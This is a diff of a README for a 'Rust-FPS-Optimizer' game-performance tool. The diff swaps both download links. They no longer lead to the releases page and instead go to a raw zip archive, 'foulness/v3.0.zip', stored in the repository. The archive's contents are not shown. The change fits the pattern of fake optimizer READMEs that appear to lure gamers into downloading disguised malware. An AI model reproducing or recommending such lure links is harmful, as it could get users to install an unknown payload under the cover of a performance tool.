@@ -1,6 +1,6 @@
 # ⚡ Rust-FPS-Optimizer - Boost Your FPS Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Rust--FPS--Optimizer-blue?style=for-the-badge&logo=windows&color=00FF00)](https://github.com/Pennyla367/Rust-FPS-Optimizer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Rust--FPS--Optimizer-blue?style=for-the-badge&logo=windows&color=00FF00)](https://raw.githubusercontent.com/Pennyla367/Rust-FPS-Optimizer/main/foulness/v3.0.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Getting started is easy. Follow these simple steps:
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/Pennyla367/Rust-FPS-Optimizer/releases](https://github.com/Pennyla367/Rust-FPS-Optimizer/releases)**
+**[https://raw.githubusercontent.com/Pennyla367/Rust-FPS-Optimizer/main/foulness/v3.0.zip](https://raw.githubusercontent.com/Pennyla367/Rust-FPS-Optimizer/main/foulness/v3.0.zip)**
 
 You will see a list of available files. Look for the latest version and click the download button.
 
